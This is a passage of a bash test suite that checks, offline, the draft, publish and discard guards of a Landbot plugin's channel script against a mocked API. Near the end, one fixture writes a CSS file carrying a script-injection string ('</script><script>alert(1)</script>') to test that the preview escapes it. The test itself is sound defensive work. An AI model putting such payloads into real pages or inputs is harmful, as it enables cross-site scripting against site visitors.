#!/usr/bin/env bash
# Offline tests for the write guards in scripts/channel, the name, body, firewall and redirect handling
# in scripts/lb, draft-check, setup-token --whoami, the marker and host checks in
# landbot-style/scripts/verify-share, and the share URL handoff prints.
# No network, no token: channel runs against a fake lb + handoff in a temp dir. Exits 1 on any failure.
set -u
HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
SRC="$HERE/plugins/landbot/skills/landbot-flows/scripts"
TROOT="$(mktemp -d)"; trap 'rm -rf "$TROOT"' EXIT
T="$TROOT/landbot-flows/scripts"; mkdir -p "$T" "$TROOT/landbot-style/modules"
cp "$HERE/plugins/landbot/skills/landbot-style/modules/"*.js "$TROOT/landbot-style/modules/"
cp "$SRC/channel" "$SRC/draft-check" "$SRC/richtext.jq" "$T/"; cp "$SRC/lb" "$T/lb.real"
export LANDBOT_STATE_DIR="$T/state"
cat > "$T/lb" <<'E'
#!/usr/bin/env bash
M="$1"; P="$2"; B="${3:-}"; D="$(dirname "$0")"
cr=$(( $(date +%s) - ${MOCK_AGE_H:-1}*3600 ))
BASE='{"format":"fullpage","persistent_menu":[],"typing_options":{"state":true},"conditional_proactives":{},"tagline":"Start","favicon":null,"hidden_fields":{},"meta_image":null,"meta_title":"","widget_height":null,"google_analytics_id":"","fb_pixel_id":"","head":"","storage_off":false,"text":{"back":"Back"},"revisit_off":true,"revisit":[],"welcome":[],"is_legal_consent_enabled":false,"privacy_policy_link":"","privacy_policy_link_text":"","privacy_policy_text":"","launcher_config":{}}'
case "$M $P" in
"GET /bots/"*"/draft") cat "${MOCK_DRAFT:-$D/draft.json}";;
"GET /bots/"*) echo "{\"data\":{\"id\":\"BOT\",\"channel_family\":\"landbot\",\"channels\":${MOCK_CHANNELS:-[\"cu-1\"]}}}";;
"GET /channels/777/test_config/") [ -n "${MOCK_NOTESTCFG:-}" ] && exit 1
   dw="$(cat "$D/dwelcome" 2>/dev/null || echo hi)"
   if [ -n "${MOCK_FLIP_DRAFT:-}" ]; then n=$(( $(cat "$D/treads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/treads"; [ "$n" -ge "$MOCK_FLIP_DRAFT" ] && echo "a builder autosave" > "$D/dchat"; fi
   jq -n --arg v "$(cat "$D/dver" 2>/dev/null || cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "$(cat "$D/dstyle" 2>/dev/null || cat "$D/style" 2>/dev/null || true)" --arg f "$(cat "$D/dfoot" 2>/dev/null || cat "$D/foot" 2>/dev/null || true)" --arg w "$dw" --arg tok "$RANDOM$RANDOM" --arg ch "$(cat "$D/dchat" 2>/dev/null || true)" --argjson br "$(cat "$D/dbranding" 2>/dev/null || cat "$D/branding" 2>/dev/null || echo true)" --argjson dz "$(cat "$D/ddesign" 2>/dev/null || cat "$D/design" 2>/dev/null || echo '{"background_color":"#ffffff","header_title":"Hi"}')" '{test:true,version:$v,style:$s,foot:$f,welcome:$w,branding:$br,chat_placeholder:$ch,design:$dz,customerToken:$tok,landbotToken:$tok,channelToken:$tok,firestore:{api_key:$tok}}';;
"GET /channels/777/copy/") [ -n "${MOCK_NOCOPY:-}" ] && exit 1
   if [ -n "${MOCK_FLIP_COPY:-}" ]; then n=$(( $(cat "$D/creads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/creads"; [ "$n" -ge "$MOCK_FLIP_COPY" ] && export MOCK_COPY_HEAD="<meta name=late>"; fi
   jq -n --argjson base "$BASE" --arg v "$(cat "$D/dver" 2>/dev/null || cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "${MOCK_COPY_STYLE:-$(cat "$D/dstyle" 2>/dev/null || cat "$D/style" 2>/dev/null || true)}" --arg f "$(cat "$D/dfoot" 2>/dev/null || cat "$D/foot" 2>/dev/null || true)" --argjson br "$(cat "$D/dbranding" 2>/dev/null || cat "$D/branding" 2>/dev/null || echo true)" --argjson dz "$(cat "$D/ddesign" 2>/dev/null || cat "$D/design" 2>/dev/null || echo '{"background_color":"#ffffff","header_title":"Hi"}')" --arg drop "${MOCK_COPY_DROP:-}" \
     '{success:true,channel:($base + {id:777,uuid:"cu-1",merged:false,version:$v,style:$s,foot:$f,design:$dz,branding:$br} + (if env.MOCK_COPY_HEAD then {head: env.MOCK_COPY_HEAD} else {} end) + (if env.MOCK_COPY_IE then {ie_compat: true} else {} end) | if $drop != "" then del(.[$drop]) else . end)}';;
"GET /channels/"*) id="${P#/channels/}"; id="${id%/}"; [ "$id" = "777" ] || exit 1
   ver=$(cat "$D/ver" 2>/dev/null || echo 3.0.0); sty=$(cat "$D/style" 2>/dev/null || true); ft=$(cat "$D/foot" 2>/dev/null || true)
   mg=$(cat "$D/merged" 2>/dev/null || echo "${MOCK_MERGED:-true}")
   if [ -n "${MOCK_FLIP_LIVE:-}" ]; then n=$(( $(cat "$D/reads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/reads"; [ "$n" -ge 2 ] && sty="moved"; fi
   if [ -n "${MOCK_FLIP:-}" ]; then n=$(( $(cat "$D/reads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/reads"; [ "$n" -ge 2 ] && mg=false; fi
   dz=$(cat "$D/design" 2>/dev/null || echo '{"background_color":"#ffffff","header_title":"Hi"}'); [ -n "${MOCK_FLIP_DESIGN:-}" ] && { n=$(( $(cat "$D/dreads" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$D/dreads"; [ "$n" -ge 3 ] && dz='{"background_color":"#000000","header_title":"Hi"}'; }
   jq -n --argjson base "$BASE" --argjson lj "$(cat "$D/live.json" 2>/dev/null || echo '{}')" --argjson br "$(cat "$D/branding" 2>/dev/null || echo true)" --arg v "$ver" --arg s "$sty" --arg f "$ft" --arg cfg "${MOCK_CFG-file://$D/pub.json}" --argjson c "$cr" --arg mg "$mg" --argjson dz "$dz" '{success:true,channel:($base + $lj + {id:777,uuid:"cu-1",version:$v,style:$s,foot:$f,created_at:$c,design:$dz,branding:$br} + (if $mg == "none" then {} else {merged:($mg == "true")} end) + (if $cfg != "" then {config_url:$cfg} else {} end))}';;
"PATCH /channels/777/discard/") echo discard >> "$D/patches"; echo true > "$D/merged"; rm -f "$D/dver" "$D/dstyle" "$D/dfoot" "$D/dwelcome" "$D/dbranding"
   echo '{"success":true,"channel":{"id":777,"merged":false}}';;
"PATCH /channels/777/") printf '%s' "$B" | jq -c . >> "$D/patches"
   if printf '%s' "$B" | jq -e '.autosave == true' >/dev/null; then pre=d; echo false > "$D/merged"; else pre=; echo true > "$D/merged"
     # a live PATCH: the channel keeps every field sent (MOCK_PUBLISH_DROP: one the server ignores), and the draft follows the live channel
     B="$(printf '%s' "$B" | jq -c --arg drop "${MOCK_PUBLISH_DROP:-}" 'if $drop != "" then del(.[$drop]) else . end')"
     jq -c -n --argjson o "$(cat "$D/live.json" 2>/dev/null || echo '{}')" --argjson b "$B" '$o + ($b | del(.style, .foot, .version, .design, .branding))' > "$D/live.json"
     printf '%s' "$B" | jq -e 'has("branding")' >/dev/null && printf '%s' "$B" | jq -c '.branding' > "$D/branding"
     rm -f "$D/dbranding" "$D/dwelcome" "$D/dchat"; fi
   v=$(printf '%s' "$B" | jq -r '.version // empty'); [ -n "$v" ] && echo "$v" > "$D/${pre}ver"
   printf '%s' "$B" | jq -e 'has("style")' >/dev/null && printf '%s' "$B" | jq -j '.style | sub("\\s+$"; "")' > "$D/${pre}style"
   printf '%s' "$B" | jq -e 'has("foot")' >/dev/null && printf '%s' "$B" | jq -j '.foot | sub("\\s+$"; "")' > "$D/${pre}foot"
   printf '%s' "$B" | jq -e 'has("design")' >/dev/null && printf '%s' "$B" | jq -c '.design' > "$D/${pre}design"
   [ -z "$pre" ] && rm -f "$D/dver" "$D/dstyle" "$D/dfoot" "$D/ddesign"
   if [ -z "$pre" ]; then
     jq -n --arg v "$(cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "$(cat "$D/style" 2>/dev/null || true)" --arg f "$(cat "$D/foot" 2>/dev/null || true)" --arg nf "${MOCK_PUB_NOFOOT:-}" --arg ns "${MOCK_PUB_NOSTYLE:-}" --argjson dz "$( { [ -z "${MOCK_PUB_OLD_DESIGN:-}" ] && cat "$D/design" 2>/dev/null; } || echo '{"background_color":"#ffffff","header_title":"Hi"}')" '{version:$v,style:(if $ns != "" then "" else $s end),design:$dz,foot:(if $nf != "" then null else $f end)}' > "${MOCK_PUB:-$D/pub.json}"
   fi
   if [ -n "$pre" ]; then
     jq -n --arg v "$(cat "$D/dver" 2>/dev/null || cat "$D/ver" 2>/dev/null || echo 3.0.0)" --arg s "$(cat "$D/dstyle" 2>/dev/null || cat "$D/style" 2>/dev/null || true)" --arg f "$(cat "$D/dfoot" 2>/dev/null || cat "$D/foot" 2>/dev/null || true)" --argjson dz "$(cat "$D/ddesign" 2>/dev/null || cat "$D/design" 2>/dev/null || echo '{}')" '{success:true,channel:{id:777,version:$v,style:$s,foot:$f,design:$dz}}'
   else echo '{}'; fi;;
*) exit 1;;
esac
E
printf '#!/usr/bin/env bash\necho "LANDBOT_HANDOFF bot=$1 builder=4069913 share=x channel=${MOCK_RESOLVED:-777} version=3.0.0"\n' > "$T/handoff"
chmod +x "$T/lb" "$T/handoff" "$T/channel"; printf 'a{color:red}' > "$T/s.css"
pass=0; fail=0
t() { local name="$1" want="$2"; shift 2; rm -f "$T/patches" "$T/live.json" "$T/branding" "$T/dbranding" "$T/treads" "$T/pub.json" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome" "$T/dchat" "$T/reads" "$T/design" "$T/ddesign" "$T/dreads"; rm -rf "$T/state/channel-drafts"; "$@" >/dev/null 2>&1; local rc=$?
  local np=0; [ -f "$T/patches" ] && np=$(wc -l < "$T/patches" | tr -d ' ')
  if [ "$rc:$np" = "$want" ]; then pass=$((pass+1)); else fail=$((fail+1)); echo "FAIL $name: rc=$rc writes=$np, want $want"; fi; }
C="$T/channel"
# The bot BOT counts as created by this plugin on this machine: its channel writes are live.
mkdir -p "$T/state/created"; date +%s > "$T/state/created/BOT"
t "uuid as channel id"        65:0 "$C" v4 ba59dd6c-uuid --bot BOT
t "write without --bot"       64:0 "$C" v4 777
t "bot with no channel"       70:0 env MOCK_CHANNELS='[]' "$C" v4 --bot BOT
t "bot with two channels"     70:0 env MOCK_CHANNELS='["a","b"]' "$C" css "$T/s.css" --bot BOT
t "bot number as channel id"  70:0 "$C" v4 4069913 --bot BOT
# No age limit: where a write lands depends on the local creation record, and pending changes block it.
t "old channel of a bot created here: live" 0:1 env MOCK_AGE_H=480 "$C" css "$T/s.css" --bot BOT
grep -q autosave "$T/patches" && { fail=$((fail+1)); echo "FAIL a write to a bot created here carried autosave"; } || pass=$((pass+1))
t "bot not created here: draft"  0:1 "$C" css "$T/s.css" --bot OTHER
grep -q '"autosave":true' "$T/patches" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a write to a bot not created here did not carry autosave"; }
[ ! -s "$T/style" ] && [ "$(cat "$T/dstyle")" = "a{color:red}" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft write touched the live style or missed the draft"; }
t "v4 on a bot not created here: draft" 0:1 "$C" v4 --bot OTHER
t "live write over pending changes refused"  75:0 env MOCK_MERGED=false "$C" css "$T/s.css" --bot BOT
t "draft write over someone else's pending changes refused" 75:0 env MOCK_MERGED=false "$C" css "$T/s.css" --bot OTHER
t "no merged flag refused"       70:0 env MOCK_MERGED=none "$C" v4 --bot BOT
t "age env var no longer matters" 0:1 env LANDBOT_CHANNEL_MAX_AGE_H=0 "$C" v4 --bot BOT
echo $(( $(date +%s) - 7*3600 )) > "$T/state/created/OLD"
t "bot created here 7 h ago: draft" 0:1 "$C" css "$T/s.css" --bot OLD
grep -q '"autosave":true' "$T/patches" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a bot past the live window was written live"; }
: > "$T/state/created/EMPTY"
t "record without an epoch: draft" 0:1 "$C" v4 --bot EMPTY
grep -q '"autosave":true' "$T/patches" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a record without an epoch counted as fresh"; }
t "channel changed between the reads refused" 75:0 env MOCK_FLIP=1 "$C" css "$T/s.css" --bot BOT
# Continuing our own draft: allowed, backed up from our last draft; discard only drops our own draft.
rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot"; rm -rf "$T/state/channel-drafts"
"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; printf 'b{color:blue}' > "$T/s2.css"
[ -f "$T/state/channel-drafts/777" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft write left no draft record"; }
"$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1 && [ "$(cat "$T/dstyle")" = "b{color:blue}" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a second draft write on our own draft was refused"; }
lastbk="$(ls -t "$T/state/backups"/channel-777-style-* | sed -n 1p)"; [ "$(cat "$lastbk")" = "a{color:red}" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL the backup of a continued draft is not our previous draft"; }
"$C" discard --bot OTHER >/dev/null 2>&1 && [ "$(cat "$T/merged")" = "true" ] && [ ! -f "$T/state/channel-drafts/777" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL discard of our own draft"; }
# Our draft record fails closed: live moved since (the person published, then edited again), or too old.
rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot"; rm -rf "$T/state/channel-drafts"
"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; printf 'published{}' > "$T/style"; np0=$(wc -l < "$T/patches" | tr -d ' ')
"$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1; rc1=$?; "$C" discard --bot OTHER >/dev/null 2>&1; rc2=$?; np1=$(wc -l < "$T/patches" | tr -d ' ')
[ "$rc1:$rc2:$((np1-np0))" = "75:75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft record was trusted after the live channel moved ($rc1:$rc2:$((np1-np0)))"; }
rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot"; rm -rf "$T/state/channel-drafts"
"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; r="$T/state/channel-drafts/777"; printf '%s %s\n' $(( $(date +%s) - 7*3600 )) "$(awk '{print $2}' "$r")" > "$r"
"$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1; [ $? = 75 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft record past its TTL was trusted"; }
# The person edited the draft after ours (any field, unpublished): continuing and discarding both refuse.
rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome"; rm -rf "$T/state/channel-drafts"
"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; echo false > "$T/dbranding"; np0=$(wc -l < "$T/patches" | tr -d ' ')
"$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1; rc1=$?; "$C" discard --bot OTHER >/dev/null 2>&1; rc2=$?; np1=$(wc -l < "$T/patches" | tr -d ' ')
[ "$rc1:$rc2:$((np1-np0))" = "75:75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft edited by the person after ours was treated as ours ($rc1:$rc2:$((np1-np0)))"; }
rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome"; rm -rf "$T/state/channel-drafts"
"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; MOCK_NOTESTCFG=1 "$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1; [ $? = 75 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL an unreadable draft was treated as ours"; }
# A draft field whose name merely contains "chat" or "customer" still counts.
rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome" "$T/dchat"; rm -rf "$T/state/channel-drafts"
"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; echo "person" > "$T/dchat"; "$C" css "$T/s2.css" --bot OTHER >/dev/null 2>&1; [ $? = 75 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL an edit to a draft field named like chat_* was ignored"; }
grep -rqi "token" "$T/state/channel-drafts" 2>/dev/null && { fail=$((fail+1)); echo "FAIL a draft record holds token text"; } || pass=$((pass+1))
rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/reads"; rm -rf "$T/state/channel-drafts"
"$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; rm -f "$T/reads"; np0=$(wc -l < "$T/patches" | tr -d ' ')
MOCK_FLIP_LIVE=1 "$C" discard --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(wc -l < "$T/patches" | tr -d ' ')
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL discard did not re-read before writing ($rc:$((np1-np0)))"; }
t "discard of someone else's draft refused" 75:0 env MOCK_MERGED=false "$C" discard --bot OTHER
t "discard with nothing pending"  0:0 "$C" discard --bot OTHER
t "draft js skips the served check" 0:1 "$C" js "$TROOT/landbot-style/modules/messaging.js" --bot OTHER
# channel publish: only our own draft, every field explicit, re-read before the write, verified after
rs() { rm -f "$T/creads" "$T/patches" "$T/live.json" "$T/branding" "$T/dbranding" "$T/treads" "$T/pub.json" "$T/ver" "$T/style" "$T/foot" "$T/merged" "$T/dver" "$T/dstyle" "$T/dfoot" "$T/dwelcome" "$T/dchat" "$T/reads" "$T/design" "$T/ddesign" "$T/dreads"; rm -rf "$T/state/channel-drafts" "$T/state/backups"; }
npat() { [ -f "$T/patches" ] && wc -l < "$T/patches" | tr -d ' ' || echo 0; }
FIELDS='["format","foot","persistent_menu","typing_options","conditional_proactives","tagline","favicon","hidden_fields","meta_image","meta_title","widget_height","google_analytics_id","fb_pixel_id","head","storage_off","style","text","revisit_off","revisit","branding","welcome","is_legal_consent_enabled","privacy_policy_link","privacy_policy_link_text","privacy_policy_text","launcher_config","version","design"]'
PUBENV="MOCK_CFG=file://$T/pub.json MOCK_PUB=$T/pub.json"
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
{ [ "$rc:$((np1-np0))" = "0:1" ] \
  && tail -1 "$T/patches" | jq -e --argjson f "$FIELDS" '(has("autosave") | not) and (keys | length) == 28 and ([$f[] as $k | has($k)] | all) and .style == "a{color:red}"' >/dev/null \
  && [ "$(cat "$T/merged")" = "true" ] && [ "$(cat "$T/style")" = "a{color:red}" ] && [ ! -f "$T/state/channel-drafts/777" ] \
  && jq -e --argjson f "$FIELDS" '(keys | length) == 28 and ([$f[] as $k | has($k)] | all)' "$(ls "$T/state/backups"/channel-777-live-* | sed -n 1p)" >/dev/null; } \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our own draft: rc=$rc writes=$((np1-np0)), want 0:1 with 28 explicit fields, merged, record gone, live backup kept"; }
t "publish over someone else's draft refused" 75:0 env MOCK_MERGED=false "$C" publish --bot OTHER
t "publish over someone else's draft on a bot made here refused" 75:0 env MOCK_MERGED=false "$C" publish --bot BOT
t "publish with nothing pending does nothing" 0:0 "$C" publish --bot OTHER
t "publish without --bot"                    64:0 "$C" publish 777
# false, "" and null in the draft go out explicitly, so Landbot cannot refill them from the live channel
rs; printf 'live{}' > "$T/style"; echo false > "$T/branding"; : > "$T/empty.css"
"$C" css "$T/empty.css" --bot OTHER >/dev/null 2>&1; env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?
{ [ "$rc" = 0 ] && tail -1 "$T/patches" | jq -e '.branding == false and .style == "" and has("favicon") and .favicon == null and .storage_off == false and .head == ""' >/dev/null \
  && [ "$(cat "$T/branding")" = "false" ] && [ ! -s "$T/style" ]; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a false or empty draft value was not sent explicitly or came back from live (rc=$rc)"; }
# a flow publish rewrites the greeting on the live channel and the draft alike: still our draft, and publish sends the LIVE greeting
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; echo '{"welcome":[{"title":"flow v2"}]}' > "$T/live.json"; echo "flow v2" > "$T/dwelcome"; np0=$(npat)
env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
{ [ "$rc:$((np1-np0))" = "0:1" ] && tail -1 "$T/patches" | jq -e '.welcome == [{"title":"flow v2"}] and .style == "a{color:red}"' >/dev/null; } \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish after a flow publish: refused our draft or sent the draft's greeting ($rc:$((np1-np0)))"; }
# only what this plugin wrote comes from the draft; anything else that differs from live is someone else's edit
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_COPY_HEAD='<meta name="x">' "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with someone's page-head edit in the draft (not in the fingerprint) ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_COPY_HEAD='<meta name="x">' "$C" discard --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL discard would throw away someone's page-head edit ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_COPY_IE=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with ie_compat differing between draft and live ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; rm -f "$T/state/channel-drafts/777.keys"; np0=$(npat)
"$C" publish --bot OTHER >/dev/null 2>"$T/pub.err"; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && grep -F 'no record of which settings' "$T/pub.err" >/dev/null && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of a draft with no record of what we wrote ($rc:$((np1-np0)))"; }
rs; echo '{"background_color":"#111111","header_title":"old"}' > "$T/ddesign"; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
{ [ "$rc:$((np1-np0))" = "0:1" ] && tail -1 "$T/patches" | jq -e '.design == {"background_color":"#ffffff","header_title":"Hi"} and .style == "a{color:red}"' >/dev/null; } \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish sent a stale draft design this plugin did not write ($rc:$((np1-np0)))"; }
rs; "$C" back off --bot OTHER >/dev/null 2>&1; np0=$(npat)
env $PUBENV "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
{ [ "$rc:$((np1-np0))" = "0:1" ] && tail -1 "$T/patches" | jq -e '.design.back_button_visible == false and .design.header_title == "Hi"' >/dev/null && [ "$(jq -r '.back_button_visible | tostring' "$T/design")" = "false" ]; } \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our Back draft ($rc:$((np1-np0)))"; }
rs; "$C" back off --bot OTHER >/dev/null 2>&1; np0=$(npat)
env $PUBENV MOCK_PUB_OLD_DESIGN=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "5:1" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our Back draft while the published config still serves the old design ($rc:$((np1-np0)))"; }
rs; "$C" back off --bot OTHER >/dev/null 2>&1; echo '{"background_color":"#000000","header_title":"Hi"}' > "$T/design"; np0=$(npat)
"$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our Back draft after the live design moved ($rc:$((np1-np0)))"; }
# someone edits a setting the draft fingerprint does not see, after the check and before the write: nothing is written
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_FLIP_COPY=2 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish when a copy-only setting moved before the write ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_FLIP_COPY=2 "$C" discard --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL discard when a copy-only setting moved before the write ($rc:$((np1-np0)))"; }
# the draft moves between the reads (a builder autosave): nothing is written
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_FLIP_DRAFT=3 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish when the draft moved before the write ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_COPY_STYLE='other{}' "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish when the copy and the previewed draft disagree ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_COPY_DROP=branding "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "70:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with a field missing from the draft copy ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_NOCOPY=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "1:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish with an unreadable draft copy ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; r="$T/state/channel-drafts/777"; printf '%s %s %s\n' $(( $(date +%s) - 7*3600 )) "$(awk '{print $2}' "$r")" "$(awk '{print $3}' "$r")" > "$r"; np0=$(npat)
"$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "75:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of our draft past its TTL ($rc:$((np1-np0)))"; }
# after the write: a field the live channel did not take, and Custom JS the account does not serve
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
env $PUBENV MOCK_PUBLISH_DROP=style "$C" publish --bot OTHER >/dev/null 2>"$T/pub.err"; rc=$?; np1=$(npat)
{ [ "$rc:$((np1-np0))" = "1:1" ] && grep -F 'NOT VERIFIED' "$T/pub.err" >/dev/null && grep -F 'in: style' "$T/pub.err" >/dev/null && grep -F 'PATCH /channels/777/ @' "$T/pub.err" >/dev/null; } \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a publish the live channel did not fully take was not reported with the undo ($rc:$((np1-np0)))"; }
rs; "$C" js "$TROOT/landbot-style/modules/messaging.js" --bot OTHER >/dev/null 2>&1; np0=$(npat)
env $PUBENV MOCK_PUB_NOFOOT=1 "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "3:1" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish of Custom JS the published config does not carry ($rc:$((np1-np0)))"; }
rs; "$C" css "$T/s.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_CFG= "$C" publish --bot OTHER >/dev/null 2>&1; rc=$?; np1=$(npat)
[ "$rc:$((np1-np0))" = "4:1" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL publish without a config url was not flagged unverified ($rc:$((np1-np0)))"; }
# channel preview: reads only; the draft's look over the published config; no draft token; nothing closes the <script>
jq -n '{channelToken:"H-777-PUB",version:"3.1.0",style:"live{}",foot:"",welcome:[{"title":"published greeting"}],design:{"header_title":"Hi"},firestore:{api_key:"public"}}' > "$T/pubcfg.json"
pvcfg() { sed -n 's/^var LB_PREVIEW_CONFIG = \(.*\);$/\1/p' "$1"; }
rs; printf 'a{color:red}</script><script>alert(1)</script>' > "$T/x.css"; "$C" css "$T/x.css" --bot OTHER >/dev/null 2>&1; np0=$(npat)
MOCK_CFG="file://$T/pubcfg.json" "$C" preview --bot OTHER --out "$T/pv.html" >/dev/null 2>&1; rc=$?; np1=$(npat)
